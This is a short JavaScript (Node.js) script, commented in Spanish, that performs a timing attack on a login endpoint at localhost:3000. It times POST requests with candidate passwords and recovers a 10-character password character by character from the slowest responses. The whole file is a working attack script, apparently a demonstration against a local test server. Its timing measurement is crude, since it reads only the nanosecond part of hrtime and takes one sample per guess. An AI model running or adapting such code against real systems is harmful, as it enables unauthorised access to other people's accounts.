// Importa el módulo 'axios' para hacer solicitudes HTTP
const axios = require('axios');

// Función para medir el tiempo que tarda una solicitud POST al servidor de login
async function medirTiempo(password) {
    const start = process.hrtime(); // Inicia un contador de tiempo de alta precisión
    try {
        // Envía una solicitud POST al servidor con la contraseña a probar
        await axios.post("http://localhost:3000/login", { password });
    } catch (err) {
        // Ignora los errores (por ejemplo, si el servidor devuelve un 401)
    }
    const end = process.hrtime(start); // Detiene el contador y calcula el tiempo transcurrido
    return end[1]; // Devuelve el tiempo en nanosegundos
}

// Función para descubrir la contraseña caracter por caracter
async function descubrirContraseña() {
    let posiblePassword = ""; // Almacena la contraseña descubierta hasta el momento
    const caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"; // Caracteres a probar

    // Itera hasta descubrir una contraseña de 10 caracteres
    for (let i = 0; i < 10; i++) {
        let maxTiempo = 0; // Almacena el tiempo máximo registrado
        let mejorLetra = ""; // Almacena el caracter que produjo el tiempo máximo

        // Prueba cada caracter posible
        for (const letra of caracteres) {
            // Mide el tiempo que tarda el servidor en responder con la contraseña parcial
            const tiempo = await medirTiempo(posiblePassword + letra);

            // Si el tiempo es mayor que el máximo registrado, actualiza el máximo
            if (tiempo > maxTiempo) {
                maxTiempo = tiempo;
                mejorLetra = letra;
            }
        }

        // Agrega el caracter que produjo el tiempo máximo a la contraseña descubierta
        posiblePassword += mejorLetra;

        // Muestra el progreso en la consola
        console.log(`Caracter descubierto: ${mejorLetra} → ${posiblePassword}`);
    }
}
// Ejecuta la función para descubrir la contraseña
descubrirContraseña();

